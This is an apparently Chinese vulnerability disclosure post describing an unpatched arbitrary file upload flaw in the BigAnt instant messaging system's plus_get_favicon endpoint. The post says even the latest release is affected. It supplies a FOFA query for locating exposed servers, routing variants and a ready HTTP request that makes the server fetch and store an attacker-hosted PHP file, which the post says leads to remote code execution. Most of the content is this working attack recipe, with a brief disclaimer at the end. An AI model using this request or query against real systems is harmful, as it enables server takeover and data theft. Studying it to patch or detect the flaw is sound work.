#  【0day】大蚂蚁 (BigAnt) 即时通讯系统 plus_get_favicon 任意文件上传漏洞  
 0day收割机   2026-02-24 10:05  
  
# 漏洞简介  
  
杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 plus_get_favicon 接口存在任意文件写入/上传漏洞，攻击者可以通过上传特制的 PHP 文件，执行恶意代码，实现服务器的远程控制，可能导致敏感信息泄露、数据篡改等危害。  
# 影响版本  
  
BigAnt 5.5.x 及以上版本用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWC213F4OwPXicxF3p0c1v4f7riaBU1yJGtTLG7FHZib3yChiaw7U33Fqrbt3upU7UCibX7VKmiaksYaF2z5dc3PibhHicbzS5fkx0UBVak/640?wx_fmt=png&from=appmsg "")  
  
经过测试，最新版本 6.0.1.20250407.1 也受影响  
# fofa语法  
> (body="/Public/static/admin/admin_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"  
  
# 漏洞复现  
> 需要注意thinkphp的路由特性，不区分大小写，且还支持如下等方式  
> /api/dispersedOrg/plus_get_favicon.html  
> /api/dispersedOrg/plus_get_favicon  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWB7MkNtqUSIgEicx1DciboWKLXQTCt8TxjqIkbPqGplR5p5TD2JR0Wtns1ZpVl6L24kDOzPVfRiaYTFWxAic4EhFdUBUWDCNwTTIrY/640?wx_fmt=png&from=appmsg "")  
  
在本地http服务的默认首页如 index.html 文件内容包含 <link rel="icon" href="/del.php">  
 这种可以通过正则校验以及测试文件del.php的内容。  
```
POST /?m=Admin&c=Plus&a=plus_get_favicon HTTP/1.1Host: Content-Type: application/x-www-form-urlencodedplus_uri=http://127.0.0.1:80&app_id=pc_client
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWCOzaS8ic4tQdib5k9XfwwPPVnqVuUNgAXYh14cwVZjcdL6ZX2tw9KzTdMpXlTE4b0K4iaALmT9uwJLfEe0D4zQzv829a38lSmDck/640?wx_fmt=png&from=appmsg "")  
  
如上图所示，我们成功上传文件到/data/plus_favicon/  
目录下。  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
